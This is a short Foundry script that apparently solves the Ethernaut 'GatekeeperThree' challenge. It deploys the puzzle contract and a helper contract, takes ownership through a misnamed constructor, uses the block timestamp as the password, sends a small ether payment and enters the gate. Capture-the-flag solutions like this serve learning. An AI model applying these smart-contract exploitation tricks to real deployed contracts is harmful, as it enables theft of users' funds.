// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
import "forge-std/Script.sol";

import {Exploit, GatekeeperThree} from "../test/gatekeeper/Gatekeeper.sol";

contract ExploitGatekeeper is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");
        address me = vm.addr(pk);

        vm.startBroadcast(me);
        GatekeeperThree gate = new GatekeeperThree();
        Exploit exploit = new Exploit();
        uint256 password = block.timestamp;
        gate.createTrick();
        exploit.call(payable(gate), 0, abi.encode(gate.construct0r.selector));

        gate.getAllowance(password);
        address(gate).call{value: 0.00101 ether}("");
        exploit.call(payable(gate), 0, abi.encode(gate.enter.selector));
        console.log(">>>> Entrant: ", gate.entrant());

        vm.stopBroadcast();
    }
}
